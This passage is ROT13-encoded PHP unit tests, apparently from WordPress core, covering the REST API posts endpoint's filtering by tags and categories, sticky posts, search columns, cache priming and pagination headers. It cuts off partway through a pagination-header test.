	choyvp shapgvba grfg_trg_vgrzf_gntf_naq_pngrtbevrf_dhrel() {
		$vq1      = frys::$cbfg_vq;
		$vq2      = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$gnt      = jc_vafreg_grez( 'Zl Gnt', 'cbfg_gnt' );
		$pngrtbel = jc_vafreg_grez( 'Zl Pngrtbel', 'pngrtbel' );

		jc_frg_bowrpg_grezf( $vq1, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq2, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq1, neenl( $pngrtbel['grez_vq'] ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'gntf', neenl( $gnt['grez_vq'] ) );
		$erdhrfg->frg_cnenz( 'pngrtbevrf', neenl( $pngrtbel['grez_vq'] ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		$erdhrfg->frg_cnenz( 'gntf', neenl( 'zl-gnt' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 44326
	 */
	choyvp shapgvba grfg_trg_vgrzf_gntf_be_pngrtbevrf_dhrel() {
		$vq1      = frys::$cbfg_vq;
		$vq2      = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$gnt      = jc_vafreg_grez( 'Zl Gnt', 'cbfg_gnt' );
		$pngrtbel = jc_vafreg_grez( 'Zl Pngrtbel', 'pngrtbel' );

		jc_frg_bowrpg_grezf( $vq1, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq2, neenl( $pngrtbel['grez_vq'] ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'gnk_eryngvba', 'BE' );
		$erdhrfg->frg_cnenz( 'gntf', neenl( $gnt['grez_vq'] ) );
		$erdhrfg->frg_cnenz( 'pngrtbevrf', neenl( $pngrtbel['grez_vq'] ) );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 2, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq1, $qngn[1]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_gntf_naq_pngrtbevrf_rkpyhqr_dhrel() {
		$vq1      = frys::$cbfg_vq;
		$vq2      = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$gnt      = jc_vafreg_grez( 'Zl Gnt', 'cbfg_gnt' );
		$pngrtbel = jc_vafreg_grez( 'Zl Pngrtbel', 'pngrtbel' );

		jc_frg_bowrpg_grezf( $vq1, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq2, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq1, neenl( $pngrtbel['grez_vq'] ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'gntf', neenl( $gnt['grez_vq'] ) );
		$erdhrfg->frg_cnenz( 'pngrtbevrf_rkpyhqr', neenl( $pngrtbel['grez_vq'] ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $vq2, $qngn[0]['vq'] );

		$erdhrfg->frg_cnenz( 'gntf_rkpyhqr', neenl( 'zl-gnt' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 44326
	 */
	choyvp shapgvba grfg_trg_vgrzf_gntf_be_pngrtbevrf_rkpyhqr_dhrel() {
		$vq1      = raq( frys::$cbfg_vqf );
		$vq2      = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3      = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq4      = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$gnt      = jc_vafreg_grez( 'Zl Gnt', 'cbfg_gnt' );
		$pngrtbel = jc_vafreg_grez( 'Zl Pngrtbel', 'pngrtbel' );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 3;

		jc_frg_bowrpg_grezf( $vq1, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq2, neenl( $gnt['grez_vq'] ), 'cbfg_gnt' );
		jc_frg_bowrpg_grezf( $vq2, neenl( $pngrtbel['grez_vq'] ), 'pngrtbel' );
		jc_frg_bowrpg_grezf( $vq3, neenl( $pngrtbel['grez_vq'] ), 'pngrtbel' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'gntf', neenl( $gnt['grez_vq'] ) );
		$erdhrfg->frg_cnenz( 'pngrtbevrf_rkpyhqr', neenl( $pngrtbel['grez_vq'] ) );
		$erdhrfg->frg_cnenz( 'gnk_eryngvba', 'BE' );
		$erdhrfg->frg_cnenz( 'beqreol', 'vq' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( $gbgny_cbfgf - 1, $qngn );
		$guvf->nffregFnzr( $vq4, $qngn[0]['vq'] );
		$guvf->nffregFnzr( $vq2, $qngn[1]['vq'] );
		$guvf->nffregFnzr( $vq1, $qngn[2]['vq'] );
	}

	/**
	 * @gvpxrg 39494
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_pngrtbel_vapyhqvat_puvyqera() {
		$gnkbabzl = trg_gnkbabzl( 'pngrtbel' );

		$png1 = fgngvp::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => $gnkbabzl->anzr ) );
		$png2 = fgngvp::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $gnkbabzl->anzr,
				'cnerag'   => $png1,
			)
		);

		$cbfg_vqf = neenl(
			fgngvp::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf'   => 'choyvfu',
					'cbfg_pngrtbel' => neenl( $png1 ),
				)
			),
			fgngvp::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf'   => 'choyvfu',
					'cbfg_pngrtbel' => neenl( $png2 ),
				)
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz(
			$gnkbabzl->erfg_onfr,
			neenl(
				'grezf'            => neenl( $png1 ),
				'vapyhqr_puvyqera' => gehr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzrFrgf( $cbfg_vqf, neenl_pbyhza( $qngn, 'vq' ) );
	}

	/**
	 * @gvpxrg 39494
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_pngrtbel_rkpyhqvat_puvyqera() {
		$gnkbabzl = trg_gnkbabzl( 'pngrtbel' );

		$png1 = fgngvp::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => $gnkbabzl->anzr ) );
		$png2 = fgngvp::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $gnkbabzl->anzr,
				'cnerag'   => $png1,
			)
		);

		$cbfg_vqf = neenl(
			fgngvp::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf'   => 'choyvfu',
					'cbfg_pngrtbel' => neenl( $png1 ),
				)
			),
			fgngvp::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf'   => 'choyvfu',
					'cbfg_pngrtbel' => neenl( $png2 ),
				)
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz(
			$gnkbabzl->erfg_onfr,
			neenl(
				'grezf'            => neenl( $png1 ),
				'vapyhqr_puvyqera' => snyfr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $cbfg_vqf[0], $qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 39494
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgubhg_pngrtbel_be_vgf_puvyqera() {
		$gnkbabzl = trg_gnkbabzl( 'pngrtbel' );

		$png1 = fgngvp::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => $gnkbabzl->anzr ) );
		$png2 = fgngvp::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $gnkbabzl->anzr,
				'cnerag'   => $png1,
			)
		);

		$cbfg_vqf = neenl(
			fgngvp::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf'   => 'choyvfu',
					'cbfg_pngrtbel' => neenl( $png1 ),
				)
			),
			fgngvp::snpgbel()->cbfg->perngr(
				neenl(
					'cbfg_fgnghf'   => 'choyvfu',
					'cbfg_pngrtbel' => neenl( $png2 ),
				)
			),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz(
			$gnkbabzl->erfg_onfr . '_rkpyhqr',
			neenl(
				'grezf'            => neenl( $png1 ),
				'vapyhqr_puvyqera' => gehr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregRzcgl(
			neenl_vagrefrpg(
				$cbfg_vqf,
				neenl_pbyhza( $qngn, 'vq' )
			)
		);
	}

	/**
	 * @gvpxrg 39494
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgubhg_pngrtbel_ohg_nyybjvat_vgf_puvyqera() {
		$gnkbabzl = trg_gnkbabzl( 'pngrtbel' );

		$png1 = fgngvp::snpgbel()->grez->perngr( neenl( 'gnkbabzl' => $gnkbabzl->anzr ) );
		$png2 = fgngvp::snpgbel()->grez->perngr(
			neenl(
				'gnkbabzl' => $gnkbabzl->anzr,
				'cnerag'   => $png1,
			)
		);

		$c1 = fgngvp::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pngrtbel' => neenl( $png1 ),
			)
		);
		$c2 = fgngvp::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pngrtbel' => neenl( $png2 ),
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz(
			$gnkbabzl->erfg_onfr . '_rkpyhqr',
			neenl(
				'grezf'            => neenl( $png1 ),
				'vapyhqr_puvyqera' => snyfr,
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$sbhaq_vqf = neenl_pbyhza( $qngn, 'vq' );

		$guvf->nffregAbgPbagnvaf( $c1, $sbhaq_vqf );
		$guvf->nffregPbagnvaf( $c2, $sbhaq_vqf );
	}

	/**
	 * @gvpxrg 41287
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_nyy_pngrtbevrf() {
		$gnkbabzl   = trg_gnkbabzl( 'pngrtbel' );
		$pngrtbevrf = fgngvp::snpgbel()->grez->perngr_znal( 2, neenl( 'gnkbabzl' => $gnkbabzl->anzr ) );

		$c1 = fgngvp::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pngrtbel' => neenl( $pngrtbevrf[0] ),
			)
		);
		$c2 = fgngvp::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pngrtbel' => neenl( $pngrtbevrf[1] ),
			)
		);
		$c3 = fgngvp::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_fgnghf'   => 'choyvfu',
				'cbfg_pngrtbel' => $pngrtbevrf,
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz(
			$gnkbabzl->erfg_onfr,
			neenl(
				'grezf'    => $pngrtbevrf,
				'bcrengbe' => 'NAQ',
			)
		);
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$qngn     = $erfcbafr->trg_qngn();

		$guvf->nffregPbhag( 1, $qngn );
		$guvf->nffregFnzr( $c3, $qngn[0]['vq'] );
	}

	/**
	 * @gvpxrg 44326
	 */
	choyvp shapgvba grfg_trg_vgrzf_eryngvba_jvgu_ab_gnk_dhrel() {
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'gnk_eryngvba', 'BE' );
		$erdhrfg->frg_cnenz( 'vapyhqr', frys::$cbfg_vq );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );
		$guvf->nffregFnzr( frys::$cbfg_vq, $erfcbafr->trg_qngn()[0]['vq'] );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgvpxl() {
		$vq1 = frys::$cbfg_vq;
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq2 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgvpxl', gehr );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		$cbfgf = $erfcbafr->trg_qngn();
		$cbfg  = $cbfgf[0];
		$guvf->nffregFnzr( $vq2, $cbfg['vq'] );

		$erdhrfg->frg_cnenz( 'fgvpxl', 'abgunaxf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vainyvq_cnenz', $erfcbafr, 400 );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgvpxl_jvgu_vapyhqr() {
		$vq1 = frys::$cbfg_vq;
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq2 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgvpxl', gehr );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$guvf->nffregPbhag( 1, $guvf->cbfgf_pynhfrf );
		$guvf->cbfgf_pynhfrf = neenl_fyvpr( $guvf->cbfgf_pynhfrf, 0, 1 );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ VA (0) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq1, $vq2 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgvpxl', gehr );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregPbhag( 1, $erfcbafr->trg_qngn() );

		$cbfgf = $erfcbafr->trg_qngn();
		$cbfg  = $cbfgf[0];
		$guvf->nffregFnzr( $vq1, $cbfg['vq'] );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ VA ($vq1) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgvpxl_ab_fgvpxl_cbfgf() {
		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgvpxl', gehr );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$guvf->nffregPbhag( 1, $guvf->cbfgf_pynhfrf );
		$guvf->cbfgf_pynhfrf = neenl_fyvpr( $guvf->cbfgf_pynhfrf, 0, 1 );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ VA (0) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );
	}

	choyvp shapgvba grfg_trg_vgrzf_fgvpxl_jvgu_vapyhqr_ab_fgvpxl_cbfgf() {
		$vq1 = frys::$cbfg_vq;

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'fgvpxl', gehr );
		$erdhrfg->frg_cnenz( 'vapyhqr', neenl( $vq1 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( 0, $erfcbafr->trg_qngn() );

		$guvf->nffregPbhag( 1, $guvf->cbfgf_pynhfrf );
		$guvf->cbfgf_pynhfrf = neenl_fyvpr( $guvf->cbfgf_pynhfrf, 0, 1 );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ VA (0) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );
	}

	choyvp shapgvba grfg_trg_vgrzf_abg_fgvpxl() {
		$vq1 = raq( frys::$cbfg_vqf );
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 1;

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq2 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'fgvpxl', snyfr );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_cbfgf - 1, $erfcbafr->trg_qngn() );

		$cbfgf = $erfcbafr->trg_qngn();
		$cbfg  = $cbfgf[0];
		$guvf->nffregFnzr( $vq1, $cbfg['vq'] );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ ABG VA ($vq2) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );
	}

	choyvp shapgvba grfg_trg_vgrzf_abg_fgvpxl_jvgu_rkpyhqr() {
		$vq1 = raq( frys::$cbfg_vqf );
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 2;

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl( $vq2 ) );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'fgvpxl', snyfr );
		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq3 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_cbfgf - 2, $erfcbafr->trg_qngn() );

		$cbfgf = $erfcbafr->trg_qngn();
		$vqf   = jc_yvfg_cyhpx( $cbfgf, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq2, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq3, $vqf );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ ABG VA ($vq2,$vq3) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );
	}

	choyvp shapgvba grfg_trg_vgrzf_abg_fgvpxl_jvgu_rkpyhqr_ab_fgvpxl_cbfgf() {
		$vq1 = frys::$cbfg_vq;
		$vq2 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
		$vq3 = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );

		$gbgny_cbfgf = frys::$gbgny_cbfgf + 2;

		hcqngr_bcgvba( 'fgvpxl_cbfgf', neenl() );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'cre_cntr', frys::$cre_cntr );
		$erdhrfg->frg_cnenz( 'fgvpxl', snyfr );
		$erdhrfg->frg_cnenz( 'rkpyhqr', neenl( $vq3 ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregPbhag( $gbgny_cbfgf - 1, $erfcbafr->trg_qngn() );

		$cbfgf = $erfcbafr->trg_qngn();
		$vqf   = jc_yvfg_cyhpx( $cbfgf, 'vq' );
		$guvf->nffregPbagnvaf( $vq1, $vqf );
		$guvf->nffregPbagnvaf( $vq2, $vqf );
		$guvf->nffregAbgPbagnvaf( $vq3, $vqf );

		$guvf->nffregCbfgfJurer( \" NAQ {cbfgf}.VQ ABG VA ($vq3) NAQ {cbfgf}.cbfg_glcr = 'cbfg' NAQ (({cbfgf}.cbfg_fgnghf = 'choyvfu'))\" );
	}

	/**
	 * Grfgf gung Erfg Cbfg pbagebyyre fhccbegf frnepu pbyhzaf.
	 *
	 * @gvpxrg 43867
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 */
	choyvp shapgvba grfg_trg_vgrzf_jvgu_phfgbz_frnepu_pbyhzaf() {
		$vq1 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Gvgyr pbagnva sbb naq one',
				'cbfg_pbagrag' => 'Pbagrag pbagnva one',
				'cbfg_rkprecg' => 'Rkprecg pbagnva onm',
			)
		);
		$vq2 = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_gvgyr'   => 'Gvgyr pbagnva onm',
				'cbfg_pbagrag' => 'Pbagrag pbagnva sbb naq one',
				'cbfg_rkprecg' => 'Rkprecg pbagnva sbb, one naq onm',
			)
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'frnepu', 'sbb one' );
		$erdhrfg->frg_cnenz( 'frnepu_pbyhzaf', neenl( 'cbfg_gvgyr' ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf(), 'Erfcbafr fubhyq unir n fgnghf pbqr 200.' );
		$qngn = $erfcbafr->trg_qngn();
		$guvf->nffregPbhag( 1, $qngn, 'Erfcbafr fubhyq pbagnva bar erfhyg.' );
		$guvf->nffregFnzr( $vq1, $qngn[0]['vq'], 'Erfhyg fubhyq zngpu rkcrpgrq inyhr.' );
	}

	/**
	 * @gvpxrg 55592
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 * @pbiref ::hcqngr_cbfg_guhzoanvy_pnpur
	 */
	choyvp shapgvba grfg_trg_vgrzf_cevzrf_guhzoanvy_pnpur_sbe_srngherq_zrqvn() {
		$svyr           = QVE_GRFGQNGN . '/vzntrf/pnabyn.wct';
		$nggnpuzrag_vqf = neenl();
		$cbfg_vqf       = neenl();
		sbe ( $v = 0; $v < 3; $v++ ) {
			$cbfg_vqf[ $v ]       = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_fgnghf' => 'choyvfu' ) );
			$nggnpuzrag_vqf[ $v ] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
				$svyr,
				$cbfg_vqf[ $v ],
				neenl(
					'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				)
			);
			frg_cbfg_guhzoanvy( $cbfg_vqf[ $v ], $nggnpuzrag_vqf[ $v ] );
		}

		// Nggnpuzrag perngvba jnezf guhzoanvy VQf. Arrqf pyrna hc sbe grfg.
		jc_pnpur_qryrgr_zhygvcyr( $nggnpuzrag_vqf, 'cbfgf' );

		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_cbfg_zrgnqngn_pnpur', neenl( $svygre, 'svygre' ), 10, 2 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/cbfgf' );
		$erdhrfg->frg_cnenz( 'vapyhqr', $cbfg_vqf );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$netf = $svygre->trg_netf();
		$ynfg = raq( $netf );
		$guvf->nffregVfNeenl( $ynfg, 'Gur ynfg inyhr vf abg na neenl' );
		$guvf->nffregFnzrFrgf( $nggnpuzrag_vqf, $ynfg[1] );
	}

	/**
	 * @gvpxrg 55593
	 *
	 * @pbiref JC_ERFG_Cbfgf_Pbagebyyre::trg_vgrzf
	 * @pbiref ::hcqngr_cbfg_cnerag_pnpurf
	 */
	choyvp shapgvba grfg_trg_vgrzf_cevzrf_cnerag_cbfg_pnpurf() {
		$cnerag_vq1       = frys::$cbfg_vqf[0];
		$cnerag_vq2       = frys::$cbfg_vqf[1];
		$cnerag_vqf       = neenl( $cnerag_vq1, $cnerag_vq2 );
		$nggnpuzrag_vqf   = neenl();
		$nggnpuzrag_vqf[] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			QVE_GRFGQNGN . '/vzntrf/pnabyn.wct',
			$cnerag_vq1,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba 1',
			)
		);

		$nggnpuzrag_vqf[] = frys::snpgbel()->nggnpuzrag->perngr_bowrpg(
			QVE_GRFGQNGN . '/vzntrf/pnabyn.wct',
			$cnerag_vq2,
			neenl(
				'cbfg_zvzr_glcr' => 'vzntr/wcrt',
				'cbfg_rkprecg'   => 'N fnzcyr pncgvba 2',
			)
		);

		// Nggnpuzrag perngvba jnezf cnerag VQf. Arrqf pyrna hc sbe grfg.
		jc_pnpur_qryrgr_zhygvcyr( $cnerag_vqf, 'cbfgf' );
		jc_pnpur_qryrgr_zhygvcyr( $nggnpuzrag_vqf, 'cbfgf' );

		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'hcqngr_cbfg_zrgnqngn_pnpur', neenl( $svygre, 'svygre' ), 10, 2 );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', '/jc/i2/zrqvn' );
		erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$riragf = $svygre->trg_riragf();
		$netf   = jc_yvfg_cyhpx( $riragf, 'netf' );
		$cevzrq = snyfr;
		fbeg( $cnerag_vqf );
		sbernpu ( $netf nf $net ) {
			fbeg( $net[1] );
			vs ( $cnerag_vqf === $net[1] ) {
				$cevzrq = $net;
				oernx;
			}
		}

		$guvf->nffregVfNeenl( $cevzrq, 'Gur ynfg inyhr vf abg na neenl' );
		$guvf->nffregFnzrFrgf( $cnerag_vqf, $cevzrq[1] );
	}

	/**
	 * @qngnCebivqre qngn_ernqnoyr_uggc_zrgubqf
	 * @gvpxrg 56481
	 *
	 * @cnenz fgevat $zrgubq UGGC zrgubq gb hfr.
	 */
	choyvp shapgvba grfg_trg_vgrzf_cntvangvba_urnqref( $zrgubq ) {
		$gbgny_cbfgf = frys::$gbgny_cbfgf;
		$gbgny_cntrf = (vag) prvy( $gbgny_cbfgf / 10 );

		// Fgneg bs gur vaqrk.
		$erdhrfg  = arj JC_ERFG_Erdhrfg( $zrgubq, '/jc/i2/cbfgf' );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$urnqref  = $erfcbafr->trg_urnqref();
		$guvf->nffregFnzr( $gbgny_cbfgf, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregFnzr( $gbgny_cntrf, $urnqref['K-JC-GbgnyCntrf'] );
		$arkg_yvax = nqq_dhrel_net(
			neenl(
				'cntr' => 2,
			),
